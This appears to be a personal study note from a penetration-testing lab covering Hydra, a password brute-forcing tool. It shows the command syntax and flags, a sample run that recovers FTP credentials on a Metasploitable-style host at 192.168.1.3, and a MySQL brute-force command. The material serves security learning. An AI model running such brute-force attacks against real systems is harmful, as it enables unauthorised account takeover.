## syntax 
```
hydra -L <username list> -P <password list> ssh://<domain> -t <thread count>
```

here we can use 
- `-l` for single username 
- `-p` for single password 
- `-t` for thread count 
- `-f` for stop on success 

```
hydra -l msfadmin -p msfadmin ftp://192.168.1.3 -t 10 -f
```

if we know the username but dont know the password then user this below command 

```bash
hydra -l msfadmin -P <password list> service://<target> -t <thread count> -f 
```

### example

```
administrator@administrator:~$ hydra -l msfadmin -P /opt/seclists/Discovery/Web-Content/big.txt ftp://192.168.1.3 -t 10 -f
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-22 10:16:50
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 10 tasks per 1 server, overall 10 tasks, 20482 login tries (l:1/p:20482), ~2049 tries per task
[DATA] attacking ftp://192.168.1.3:21/
[21][ftp] host: 192.168.1.3   login: msfadmin   password: msfadmin
[STATUS] attack finished for 192.168.1.3 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-22 10:17:41
```

after setup mysql creating the test user and granting all privileges to that user 
refer here - [[metasploitable mysql setup]]

hydra to find the mysql user credentials 

```
hydra -l msfadmin -P /opt/seclist/Discovery/Web-Content/big.txt mysql://192.168.1.3 -f
```



